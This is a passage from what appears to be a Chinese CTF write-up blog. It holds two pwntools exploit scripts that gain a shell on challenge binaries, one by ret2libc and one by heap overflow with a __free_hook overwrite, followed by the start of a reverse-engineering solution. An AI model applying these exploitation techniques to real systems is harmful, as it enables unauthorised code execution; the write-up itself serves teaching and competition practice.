advice\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    base = main_addr - elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">    puts_plt = base + elf.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    puts_got = base + elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;main_add = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(main_addr)))</span><br><span class="line">    log.success(<span class="string">&quot;puts_plt = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">    log.success(<span class="string">&quot;elf_base = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(base)))</span><br><span class="line">    log.success(<span class="string">&quot;puts_got = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(puts_got)))</span><br><span class="line">    </span><br><span class="line">    offset = <span class="number">0x13c</span></span><br><span class="line">    ret = base + <span class="number">0x100e</span></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    global_offset_table_addr = base + <span class="number">0x5000</span><span class="comment">#0x4fa0</span></span><br><span class="line">    log.success(<span class="string">&quot;global_offset_table_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(global_offset_table_addr)))</span><br><span class="line">    payload1 = (offset -<span class="number">8</span>) * <span class="string">b&quot;a&quot;</span> + p32(global_offset_table_addr) + p32(global_offset_table_addr) + p32(ret) + p32(puts_plt) + p32(backdoor) + p32(puts_got)</span><br><span class="line">    <span class="comment"># payload1 = offset * b&quot;a&quot; + p32(ret) + p32(main_addr)</span></span><br><span class="line">    <span class="comment"># payload1 = offset * b&quot;a&quot; + p32(ret) + p32(main_addr) </span></span><br><span class="line">    io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">    puts_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    log.success(<span class="string">&quot;puts_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc_base = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;system_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    io.recvuntil(<span class="string">b&quot;So?How are you?\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;g01den\x00&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    io.recvuntil(<span class="string">b&quot;plz input the count of your advice\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&quot;binsh_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(binsh_addr)))</span><br><span class="line">    payload2 = (offset -<span class="number">8</span>) * <span class="string">b&quot;a&quot;</span> + p32(global_offset_table_addr) + p32(global_offset_table_addr) + p32(ret)</span><br><span class="line">    payload2 += p32(system_addr) + p32(binsh_addr) + p32(binsh_addr) + p32(binsh_addr)</span><br><span class="line">    </span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>​		这里 payload2 的 <code>p32(global_offset_table_addr) + p32(global_offset_table_addr)</code>  有点儿问题，不是我的 exp 的问题，是我最开始本地调题目的时候出现的问题，我发现它这里如果不泄露这个地址的话就打不通，但为啥现在不需要这个都能出，有点过于随缘了，如果不加上这个地址不通的话， 那就考虑 gdb 调一下看看是否这里缺失了什么，或者寄存器之类的问题（补充，这里出现问题是因为再 call puts 的 plt 的时候，出现了问题，有个存在 ebp-4 的地址给 mov 到了 ebx 寄存器中，同时，存在 jmp ebp+XX 相关代码，动调的时候，发现报错地址是 aaaa，所以改成 <code>p32(global_offset_table_addr) + p32(global_offset_table_addr)</code>  就能打通）。</p>
<h3 id="arcaea_sorting_revenge"><a class="markdownIt-Anchor" href="#arcaea_sorting_revenge">#</a> Arcaea_Sorting_Revenge：</h3>
<p>​		似乎出了个板子题，不过，我也算是尽力了吧，堆这玩意儿是真的难。</p>
<p>​		程序做了个简单的存储功能，arcaea 存储分数并输出的功能，删除功能里会将 bss 段里的当前指针置零，但是歌曲信息那个 chunk 里面，指向 description 的指针没有置零，edit 修改了输入的长度，但是没有重新 malloc 新的空间，没有检测大小，存在堆溢出，增加功能里一次 malloc 了两次 chunk，第二次可以控制大小。</p>
<p>​		首先增加三次书，每次都是，控制 size 大小为 0x91，保证 chunk 在被 free 的时候能进 unsortedbin，free 掉编号为 1 的这个音乐，然后重新建一个歌曲，为了让 chunk 里有 unsortedbin 里的数据，也就是 fd 或者 bk 指针，因为 unsortedbin 目前只有一个 chunk，所以 fd，bk 指针均指向 main_arena，可以用来 leak 掉 libc 地址，重新 add 了一个之后，编号依旧为 1，然后写入的 content 为八个字节，不要写入其他内容，之后 show 可以 leak 出 libc 地址，之后为了 leak 堆的地址，我 free 了两次，但是实际上并不需要这么做，之后就是利用 edit 的溢出功能，在堆上修改 chunk，达成伪造，伪造指针，指向任意地址，这里指向 <code>__free_hook</code> ，然后 edit 修改 <code>__free_hook</code>  为 <code>one_gadget</code>  的地址，然后进行 getshell。</p>
<p>​		算是个比较板子的堆题吧。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;154.64.254.169&quot;,33215)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,rating,score,descSize,desc</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s name:&quot;</span>,name)</span><br><span class="line">	io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class="built_in">str</span>(rating))</span><br><span class="line">	io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s score:&quot;</span>,<span class="built_in">str</span>(score))</span><br><span class="line">	io.sendlineafter(<span class="string">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class="built_in">str</span>(descSize))</span><br><span class="line">	io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s descript:&quot;</span>,desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&quot;plz input index you want to delete(index from 0) :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,descSize,desc</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&quot;plz input index you want to delete(index from 0) :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	io.sendlineafter(<span class="string">b&quot;plz input max size you want to change to:&quot;</span>,<span class="built_in">str</span>(descSize))</span><br><span class="line">	io.sendafter(<span class="string">b&quot;plz input description:&quot;</span>,desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;plz enter your username:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;g01den&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;testify&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;hardhard&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;bbbb&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;what&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;cccc&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;nani&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;######################leaking libc address########################3&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s name:&quot;</span>,<span class="string">b&quot;dddd&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s score:&quot;</span>,<span class="built_in">str</span>(<span class="number">10002221</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class="built_in">str</span>(<span class="number">128</span>))</span><br><span class="line">io.sendafter(<span class="string">b&quot;plz input music&#x27;s descript:&quot;</span>,<span class="string">b&quot;dddddddd&quot;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;dddddddd&quot;</span>)</span><br><span class="line"><span class="comment"># main_arena = u64(io.recvuntil(b&quot;\x7f&quot;)[:-6].ljust(8,b&quot;\x00&quot;))</span></span><br><span class="line"><span class="comment"># main_arena = u64(io.recvuntil(b&quot;\x7f&quot;).ljust(8,b&quot;\x00&quot;))</span></span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;main_arena =&gt; &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(main_arena)))</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;eeee&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;eeeeeeee&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;######################leaking chunk6 address########################3&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s name:&quot;</span>,<span class="string">b&quot;ffff&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s score:&quot;</span>,<span class="built_in">str</span>(<span class="number">10002221</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class="built_in">str</span>(<span class="number">128</span>))</span><br><span class="line">io.sendafter(<span class="string">b&quot;plz input music&#x27;s descript:&quot;</span>,<span class="string">b&quot;ffffffff&quot;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;ffffffff&quot;</span>)</span><br><span class="line">chunk = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">chunk_basee = chunk - <span class="number">0x210</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk))</span><br><span class="line">log.success(<span class="string">&quot;chunk_basee =&gt; &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(chunk_basee)))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">target_chunk = chunk_basee + <span class="number">0x210</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x80</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x51</span>) + <span class="string">b&quot;b&quot;</span> * <span class="number">0x30</span> + p64(<span class="number">1</span>) + p64(<span class="number">10002221</span>) + p64(free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x200</span>,payload)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,p64(one_gadget))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>注：别问为啥没有剩下两个 pwn 题的 wp，因为我也不会，并且短时间内学不会</strong></p>
<h2 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Re：</h2>
<h3 id="babyre"><a class="markdownIt-Anchor" href="#babyre">#</a> babyre：</h3>
<p>​		无壳。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">start</span><span class="params">(__int64 a1, __int64 a2, <span class="type">void</span> (*a3)(<span class="type">void</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = v5;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  _libc_start_main(main, v4, &amp;retaddr, <span class="number">0LL</span>, <span class="number">0LL</span>, a3, &amp;v5);</span><br><span class="line">  __halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		是 Linux 编译的，进 main 里看看</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE v6[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class="line">  _BYTE v7[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-80h] BYREF</span></span><br><span class="line">  _BYTE v8[<span class="number">32</span>]; <span class="comment">// [rsp+40h] [rbp-60h] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">40</span>]; <span class="comment">// [rsp+60h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+88h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v6, a2, a3);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v7, a2, v3);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v8, a2, v4);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, &amp;unk_21AD);</span><br><span class="line">  std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="type">char</span>&gt;(&amp;std::cin, v6);</span><br><span class="line">  <span class="built_in">sub_147E</span>();</span><br><span class="line">  <span class="built_in">sub_1558</span>();</span><br><span class="line">  <span class="built_in">sub_13A9</span>(v8, v6);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(v7, v6);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v9, v6);</span><br><span class="line">  <span class="built_in">sub_1920</span>(v9, v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v9);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v9, v7);</span><br><span class="line">  <span class="built_in">sub_17A7</span>(v9);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v9);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v8);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		C++ 逆向，代码不复杂，Shift+F12 找关键字符串，找到了这个：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000000021BF aWrongValue     db &#x27;Wrong Value&#x27;,0      ; DATA XREF: sub_17A7+110↑o</span><br><span class="line">.rodata:00000000000021CB aCurruntValue   db &#x27;Currunt Value&#x27;,0    ; DATA XREF: sub_17A7+149↑o</span><br></pre></td></tr></table></figure>
<p>​		跟踪一下，这个函数调用了：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_17A7</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-1B0h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1ACh]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+18h] [rbp-1A8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class="line">  _DWORD v6[<span class="number">102</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+1B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = std::string::<span class="built_in">length</span>(a1);</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">0x190</span>uLL);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">    v6[i] = *(<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](a1, i) ^ (i / <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6[j] != dword_4020[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="number">1</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Wrong Value&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Currunt Value&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		这里有个异或运算，逐个比较，推测这里就是目的函数，返回 main 函数，传参是 v9，盯着 v9，从下往上看，找到门路：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_1920</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-9Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+18h] [rbp-98h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-94h]</span></span><br><span class="line">  _WORD *v9; <span class="comment">// [rsp+20h] [rbp-90h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+28h] [rbp-88h]</span></span><br><span class="line">  _BYTE v11[<span class="number">44</span>]; <span class="comment">// [rsp+30h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+5Ch] [rbp-54h]</span></span><br><span class="line">  _QWORD v13[<span class="number">6</span>]; <span class="comment">// [rsp+60h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+90h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+98h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="built_in">sizeof</span>(v13));</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i )</span><br><span class="line">    *((_BYTE *)v13 + i) = dword_2040[i];</span><br><span class="line">  v10 = std::string::<span class="built_in">size</span>(a1);</span><br><span class="line">  v9 = (_WORD *)std::string::<span class="built_in">data</span>(a1);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v11, a2, v2);</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; (<span class="type">int</span>)(v10 / <span class="number">3</span>); ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)((<span class="type">char</span> *)&amp;v12 + <span class="number">1</span>) = *v9;</span><br><span class="line">    v3 = v9 + <span class="number">1</span>;</span><br><span class="line">    v9 = (_WORD *)((<span class="type">char</span> *)v9 + <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">HIBYTE</span>(v12) = *v3;</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (<span class="built_in">BYTE1</span>(v12) &gt;&gt; <span class="number">2</span>)));</span><br><span class="line">    std::string::<span class="keyword">operator</span>+=(</span><br><span class="line">      v11,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)v13 + (((<span class="type">unsigned</span> __int8)(<span class="number">16</span> * <span 